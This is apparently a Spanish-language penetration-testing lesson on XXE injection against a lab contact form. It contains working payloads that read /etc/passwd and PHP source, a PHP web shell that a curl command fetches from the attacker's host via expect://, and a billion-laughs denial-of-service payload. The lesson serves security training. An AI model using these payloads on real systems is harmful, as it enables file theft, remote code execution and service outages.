Cuando una aplicación web confía en datos XML no filtrados provenientes de la entrada del usuario, es posible que podamos hacer referencia a un documento DTD XML externo y definir nuevas entidades XML personalizadas. Supongamos que podemos definir nuevas entidades y hacer que se muestren en la página web. En ese caso, también deberíamos poder definir entidades externas y hacer que hagan referencia a un archivo local, que, al ser mostrado, nos revelaría el contenido de ese archivo en el servidor back-end.

Veamos cómo podemos identificar posibles vulnerabilidades XXE y explotarlas para leer archivos sensibles del servidor back-end.

---

## Identificación

El primer paso para identificar posibles vulnerabilidades XXE es encontrar páginas web que acepten una entrada de usuario en formato XML. Podemos empezar el ejercicio al final de esta sección, que tiene un `Contact Form`:

   
`http://SERVER_IP:PORT/index.php`

![Identificación de XXE](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

Si completamos el formulario de contacto y hacemos clic en `Send Data`, luego interceptamos la solicitud HTTP con Burp, obtenemos la siguiente solicitud:

![Solicitud XXE](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

Como podemos ver, el formulario parece estar enviando nuestros datos en un formato XML al servidor web, convirtiéndolo en un objetivo potencial para pruebas XXE. Supongamos que la aplicación web utiliza bibliotecas XML obsoletas y no aplica ningún filtro o sanitización a nuestra entrada XML. En ese caso, podríamos explotar este formulario XML para leer archivos locales.

Si enviamos el formulario sin ninguna modificación, obtenemos el siguiente mensaje:

![Respuesta XXE](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Vemos que el valor del elemento `email` se está mostrando nuevamente en la página. Para imprimir el contenido de un archivo externo en la página, debemos `observar qué elementos se están mostrando, de modo que sepamos en qué elementos inyectar`. En algunos casos, no se pueden mostrar elementos, lo cual cubriremos cómo explotar en las secciones siguientes.

Por ahora, sabemos que cualquier valor que coloquemos en el elemento `<email></email>` se mostrará en la respuesta HTTP. Entonces, intentemos definir una nueva entidad y luego usarla como una variable en el elemento `email` para ver si se reemplaza con el valor que definimos. Para hacerlo, podemos usar lo que aprendimos en la sección anterior para definir nuevas entidades XML y agregar las siguientes líneas después de la primera línea en la entrada XML:


```r
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Nota:** En nuestro ejemplo, la entrada XML en la solicitud HTTP no tenía ninguna DTD declarada dentro de los datos XML, ni referenciada externamente, por lo que agregamos una nueva DTD antes de definir nuestra entidad. Si el `DOCTYPE` ya estuviera declarado en la solicitud XML, simplemente agregaríamos el elemento `ENTITY`.

Ahora, deberíamos tener una nueva entidad XML llamada `company`, que podemos referenciar con `&company;`. Entonces, en lugar de usar nuestro correo electrónico en el elemento `email`, intentemos usar `&company;` y ver si se reemplaza con el valor que definimos (`Inlane Freight`):

![Nueva Entidad](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

Como podemos ver, la respuesta utilizó el valor de la entidad que definimos (`Inlane Freight`) en lugar de mostrar `&company;`, lo que indica que podemos inyectar código XML. En contraste, una aplicación web no vulnerable mostraría `&company;` como un valor bruto. `Esto confirma que estamos tratando con una aplicación web vulnerable a XXE`.

**Nota:** Algunas aplicaciones web pueden usar un formato JSON por defecto en la solicitud HTTP, pero aún pueden aceptar otros formatos, incluido XML. Entonces, incluso si una aplicación web envía solicitudes en un formato JSON, podemos intentar cambiar el encabezado `Content-Type` a `application/xml`, y luego convertir los datos JSON a XML con una [herramienta en línea](https://www.convertjson.com/json-to-xml.htm). Si la aplicación web acepta la solicitud con datos XML, entonces también podemos probarla contra vulnerabilidades XXE, lo que puede revelar una vulnerabilidad XXE no anticipada.

---

## Lectura de Archivos Sensibles

Ahora que podemos definir nuevas entidades XML internas, veamos si podemos definir entidades XML externas. Hacerlo es bastante similar a lo que hicimos antes, pero solo agregaremos la palabra clave `SYSTEM` y definiremos la ruta de referencia externa después de ella, como hemos aprendido en la sección anterior:


```r
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Ahora enviemos la solicitud modificada y veamos si el valor de nuestra entidad XML externa se establece en el archivo que referenciamos:

![Entidad Externa](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

Vemos que, de hecho, obtuvimos el contenido del archivo `/etc/passwd`, `lo que significa que hemos explotado con éxito la vulnerabilidad XXE para leer archivos locales`. Esto nos permite leer el contenido de archivos sensibles, como archivos de configuración que pueden contener contraseñas u otros archivos sensibles como una clave SSH `id_rsa` de un usuario específico, que puede otorgarnos acceso al servidor back-end. Podemos referirnos al módulo de [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) para ver qué ataques se pueden llevar a cabo a través de la divulgación de archivos locales.

**Consejo:** En ciertas aplicaciones web Java, también podemos especificar un directorio en lugar de un archivo, y obtendremos una lista de directorios en su lugar, lo cual puede ser útil para ubicar archivos sensibles.

---

## Lectura del Código Fuente

Otro beneficio de la divulgación de archivos locales es la capacidad de obtener el código fuente de la aplicación web. Esto nos permitiría realizar un `Whitebox Penetration Test` para revelar más vulnerabilidades en la aplicación web, o al menos revelar configuraciones secretas como contraseñas de bases de datos o claves API.

Entonces, veamos si podemos usar el mismo ataque para leer el código fuente del archivo `index.php`, como sigue:

![Archivo PHP](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Como podemos ver, esto no funcionó, ya que no obtuvimos ningún contenido. Esto ocurrió porque `el archivo que estamos referenciando no está en un formato XML adecuado, por lo que no se puede referenciar como una entidad XML externa`. Si un archivo contiene algunos de los caracteres especiales de XML (por ejemplo, `<`/`>`/`&`), rompería la referencia de la entidad externa y no se usaría para la referencia. Además, no podemos leer ningún dato binario, ya que tampoco se ajustaría al formato XML.

Afortunadamente, PHP proporciona filtros de envoltura que nos permiten codificar en base64 ciertos recursos 'incluyendo archivos', en cuyo caso la salida final en base64 no rompería el formato XML. Para hacerlo, en lugar de usar `file://` como nuestra referencia, usaremos el filtro `php://filter/` de PHP. Con este filtro, podemos especificar el codificador `convert.base64-encode` como nuestro filtro, y luego agregar un recurso de entrada (por ejemplo, `resource=index.php`), como sigue:


```r
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Con eso, podemos enviar nuestra solicitud, y obtendremos la cadena codificada en base64 del archivo `index.php`:

![Filtro PHP](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

Podemos seleccionar la cadena base64, hacer clic en la pestaña Inspector de Burp (en el panel derecho), y nos mostrará el archivo decodificado. Para más información sobre los filtros de PHP, puedes referirte al módulo de [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23).

`Este truco solo funciona con aplicaciones web PHP`. La siguiente sección discutirá un método más avanzado para leer el código fuente, que debería funcionar con cualquier marco web.

---

## Ejecución Remota de Código con XXE

Además de leer archivos locales, podemos obtener ejecución de código en el servidor remoto. El método más fácil sería buscar claves `ssh`, o intentar utilizar un truco de robo de hash en aplicaciones web basadas en Windows, realizando una llamada a nuestro servidor. Si estos no funcionan, aún podríamos ejecutar comandos en aplicaciones web basadas en PHP a través del filtro `PHP://expect`, aunque esto requiere que el módulo `expect` de PHP esté instalado y habilitado.

Si el XXE imprime directamente su salida 'como se muestra en esta sección', entonces podemos ejecutar comandos básicos como `expect://id`, y la página debería imprimir la salida del comando. Sin embargo, si no tuviéramos acceso a la salida, o necesitáramos ejecutar un comando más complicado 'por ejemplo, reverse shell', entonces la sintaxis XML podría romperse y el comando podría no ejecutarse.

El método más eficiente para convertir XXE en RCE es obtener un web shell de nuestro servidor y escribirlo en la aplicación web, y luego interactuar con él para ejecutar comandos. Para hacerlo, podemos comenzar escribiendo un web shell básico en PHP y comenzando un servidor web python, como sigue:


```r
echo '<?php

 system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

Ahora, podemos usar el siguiente código XML para ejecutar un comando `curl` que descargue nuestro web shell en el servidor remoto:


```r
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Nota:** Reemplazamos todos los espacios en el código XML anterior con `$IFS`, para evitar romper la sintaxis XML. Además, muchos otros caracteres como `|`, `>`, y `{` pueden romper el código, por lo que debemos evitar usarlos.

Una vez que enviemos la solicitud, deberíamos recibir una solicitud en nuestra máquina para el archivo `shell.php`, después de lo cual podemos interactuar con el web shell en el servidor remoto para ejecutar comandos.

**Nota:** El módulo expect no está habilitado/instalado por defecto en los servidores PHP modernos, por lo que este ataque puede no funcionar siempre. Es por eso que XXE generalmente se utiliza para divulgar archivos locales sensibles y el código fuente, lo que puede revelar vulnerabilidades adicionales o formas de obtener ejecución de código.

## Otros Ataques XXE

Otro ataque común que se lleva a cabo a través de vulnerabilidades XXE es la explotación SSRF, que se utiliza para enumerar puertos abiertos localmente y acceder a sus páginas, entre otras páginas web restringidas, a través de la vulnerabilidad XXE. El módulo de [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks) cubre exhaustivamente SSRF, y las mismas técnicas pueden llevarse a cabo con ataques XXE.

Finalmente, un uso común de los ataques XXE es causar una Denial of Service (DOS) al servidor web que aloja, con el uso del siguiente payload:


```r
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Este payload define la entidad `a0` como `DOS`, la referencia en `a1` múltiples veces, referencia `a1` en `a2`, y así sucesivamente hasta que la memoria del servidor back-end se agote debido a los bucles de auto-referencia. Sin embargo, `este ataque ya no funciona con servidores web modernos (por ejemplo, Apache), ya que protegen contra la auto-referencia de entidades`. Pruébalo contra este ejercicio y ve si funciona.